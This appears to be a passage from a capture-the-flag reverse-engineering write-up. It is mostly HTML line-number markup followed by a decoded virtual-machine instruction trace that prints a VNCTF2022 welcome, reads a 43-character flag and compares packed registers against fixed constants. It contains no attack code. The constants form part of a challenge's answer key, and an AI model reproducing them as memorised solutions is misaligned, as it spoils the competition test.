class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">87</span> </span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">101</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">108</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">99</span> </span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">111</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">109</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">101</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">32</span> </span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">116</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">111</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">32</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">86</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">78</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">67</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">84</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">70</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">50</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">48</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">50</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">50</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">33</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">10</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">105</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">110</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">112</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">117</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">116</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">32</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">102</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">108</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">97</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">103</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">58</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">10</span></span><br><span class="line">putchar</span><br><span class="line">VM-&gt;REG[<span class="number">19</span>] = <span class="number">73</span></span><br><span class="line">VM-&gt;REG[<span class="number">3</span>] = <span class="number">0</span></span><br><span class="line">VM-&gt;REG[<span class="number">1</span>] = <span class="number">43</span></span><br><span class="line">VM-&gt;REG[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">getchar</span><br><span class="line">push REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">1</span>] -= VM-&gt;REG[<span class="number">2</span>]</span><br><span class="line">CMP VM-&gt;REG[<span class="number">3</span>], VM-&gt;REG[<span class="number">1</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]  //输入flag，长度是<span class="number">43</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">push REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">6</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">6</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">6</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">6</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">6</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">6</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">6</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">6</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">7</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">7</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">7</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">7</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">7</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">7</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">7</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">7</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">8</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">8</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">8</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">9</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">9</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">9</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">9</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">9</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">9</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">9</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">9</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">10</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">10</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">10</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">10</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">10</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">10</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">10</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">10</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">11</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">11</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">11</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">12</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">12</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">12</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">12</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">12</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">12</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">12</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">12</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">13</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">13</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">13</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">13</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">13</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">13</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">13</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">13</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">14</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">14</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">14</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">15</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">15</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">15</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">5</span>] = <span class="number">256</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">16</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = VM-&gt;REG[<span class="number">16</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] *= VM-&gt;REG[<span class="number">5</span>];</span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] = VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">pop REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">16</span>] += VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">nop</span><br><span class="line">push REG[<span class="number">6</span>]</span><br><span class="line">push REG[<span class="number">7</span>]</span><br><span class="line">push REG[<span class="number">8</span>]</span><br><span class="line">push REG[<span class="number">9</span>]</span><br><span class="line">push REG[<span class="number">10</span>]</span><br><span class="line">push REG[<span class="number">11</span>]</span><br><span class="line">push REG[<span class="number">12</span>]</span><br><span class="line">push REG[<span class="number">13</span>]</span><br><span class="line">push REG[<span class="number">14</span>]</span><br><span class="line">push REG[<span class="number">15</span>]</span><br><span class="line">push REG[<span class="number">16</span>]</span><br><span class="line">pop REG[<span class="number">1</span>]</span><br><span class="line">pop REG[<span class="number">2</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">284</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">340</span></span><br><span class="line">VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">0</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">3906065887</span></span><br><span class="line">VM-&gt;REG[<span class="number">19</span>] = <span class="number">387</span></span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">339</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">1</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">4125344020</span></span><br><span class="line">CMP VM-&gt;REG[<span class="number">0</span>], VM-&gt;REG[<span class="number">2</span>] <span class="keyword">if</span> yes: VM-&gt;_eip = <span class="number">3</span> * VM-&gt;REG[<span class="number">19</span>]</span><br><span class="line">pop REG[<span class="number">1</span>]</span><br><span class="line">pop REG[<span class="number">2</span>]</span><br><span class="line">VM-&gt;REG[<span class="number">20</span>] = <span class="number">295</span></span><br><span class="line">VM-&gt;REG[<span class="number">0</span>] = <span class="number">340</span></span><br><span 